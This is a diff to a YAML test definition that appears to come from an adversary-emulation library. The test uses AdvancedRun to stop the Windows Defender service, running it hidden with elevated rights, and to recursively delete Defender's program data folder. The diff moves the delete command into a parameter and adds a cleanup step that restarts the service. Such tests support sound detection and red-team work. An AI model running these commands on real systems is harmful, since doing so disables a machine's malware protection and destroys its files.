@@ -598,6 +598,10 @@ atomic_tests:
       description: Path of Advanced Run executable
       type: Path
       default: '$env:temp\AdvancedRun.exe'
+    CommandToRun:
+      description: The secondary command that AdvancedRun should run
+      type: Path
+      default: rmdir '$env:programdata\Microsoft\Windows Defender' -Recurse
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -610,6 +614,8 @@ atomic_tests:
   executor:
     command: |
       Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
-      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "rmdir '$env:programdata\Microsoft\Windows Defender' -Recurse" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "#{CommandToRun}" /StartDirectory "" /RunAs 8 /Run} Catch{}
+    cleanup_command: |
+      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
     name: powershell
     elevation_required: true
